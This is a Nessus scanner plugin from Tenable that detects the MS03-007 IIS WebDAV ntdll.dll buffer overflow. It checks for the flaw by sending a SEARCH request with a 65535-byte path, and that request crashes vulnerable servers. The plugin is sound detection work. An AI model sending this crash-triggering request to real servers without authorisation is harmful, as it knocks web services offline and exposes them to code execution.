#
# (C) Tenable Network Security, Inc.
#

# Tested on :
#	    W2K SP3 + the fix -> IIS issues an error
#	    W2K SP3 -> IIS temporarily crashes
#	    W2K SP2 -> IIS temporarily crashes
# 	    W2K SP1 -> IIS does not crash, but issues a message
#		       about an internal error
#	    
#	    W2K     -> IIS does not crash, but issues a message about
#		       an internal error
#

include("compat.inc");

if(description)
{
  script_id(11412);
  script_version ("$Revision: 1.41 $");
 
  script_cve_id("CVE-2003-0109");
  script_bugtraq_id(7116);
  script_osvdb_id(4467);
  script_xref(name:"MSFT", value:"MS03-007");

  script_name(english:"Microsoft IIS WebDAV ntdll.dll Remote Overflow (MS03-007)");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote WebDAV server is vulnerable to a buffer overflow when
it receives a too long request.

An attacker may use this flaw to execute arbitrary code within the 
LocalSystem security context." );
 script_set_attribute(attribute:"see_also", value:"http://technet.microsoft.com/en-us/security/bulletin/ms03-007" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2003/Jun/26" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/vulnwatch/2003/q1/142" );
 script_set_attribute(attribute:"solution", value:
"Apply the patches referenced above." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'MS03-007 Microsoft IIS 5.0 WebDAV ntdll.dll Path Overflow');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'CANVAS');

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/03/18");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/05/30");
 script_cvs_date("$Date: 2016/10/27 15:03:53 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:iis");
script_end_attributes();


 script_summary(english:"WebDAV buffer overflow");
 script_category(ACT_DESTRUCTIVE_ATTACK);  
 script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie("find_service1.nasl", "http_version.nasl", "smb_hotfixes.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("smb_hotfixes.inc");
include("misc_func.inc");
include("http.inc");


if ( hotfix_check_sp(win2k:4, xp:1, nt:7) == 0 ) exit(0);
if ( hotfix_missing(name:"815021")  == 0 ) exit(0);

port = get_http_port(default:80);
banner = get_http_banner(port:port);
if ("IIS" >!< banner ) exit(0);

# We really check for the flaw (at the expense of crashing IIS
  
if (http_is_dead(port:port)) exit(0);

 	 body = 
	     '<?xml version="1.0"?>\r\n' +
	     '<g:searchrequest xmlns:g="DAV:">\r\n' +
	     '<g:sql>\r\n' +
	     'Select "DAV:displayname" from scope()\r\n' +
	     '</g:sql>\r\n' +
	     '</g:searchrequest>\r\n';
	     
	 # This is where the flaw lies. SEARCH /AAAA.....AAAA crashes
	 # the remote server. The buffer has to be 65535 or 65536 bytes
	 # long, nothing else
	 
w = http_send_recv3(method:"SEARCH", port: port, item: "/"+crap(65535),
  content_type: "text/xml", data: body);

if (http_is_dead(port:port))
{
   security_hole(port);
   exit(0);
}

if (isnull(w)) exit(0, "The web server did not answer or dropped the request");

r = strcat(w[0], w[1], '\r\n', w[2]);
if (w[0] =~ "^HTTP/1\.[0-1] 500 " && "(exception)" >< r)
  security_hole(port);
